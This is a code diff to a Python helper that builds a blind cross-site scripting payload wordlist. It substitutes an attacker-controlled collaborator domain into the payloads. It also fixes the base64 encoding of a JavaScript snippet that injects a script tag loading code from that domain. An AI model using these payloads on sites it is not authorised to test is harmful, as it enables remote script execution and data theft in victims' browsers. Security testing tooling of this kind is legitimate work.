@@ -5,11 +5,13 @@ def build_blind_xss_wordlist(wordlist, domain_collab):
     blind_xss_list = []
     with open(wordlist, "r") as payloads:
         for payload in payloads:
-            blind_xss_list.append(payload.replace("domain_collab",domain_collab))
             if "BASE_64_PAYLOAD_PLACEHOLDER" in payload:
-                replacement = str(base64.b64encode(b'var a=document.createElement("script");a.src="http://'+domain_collab.encode("utf-8")+b'";document.body.appendChild(a);'))
+                replacement = (base64.b64encode(b'var a=document.createElement("script");a.src="http://'+domain_collab.encode("utf-8")+b'";document.body.appendChild(a);')).decode('utf-8')
                 blind_xss_list.append(payload.replace("BASE_64_PAYLOAD_PLACEHOLDER",replacement))
+            else:
+                blind_xss_list.append(payload.replace("domain_collab",domain_collab))
     return blind_xss_list
+
 
 if __name__ == "__main__":
     if len(sys.argv) != 3:
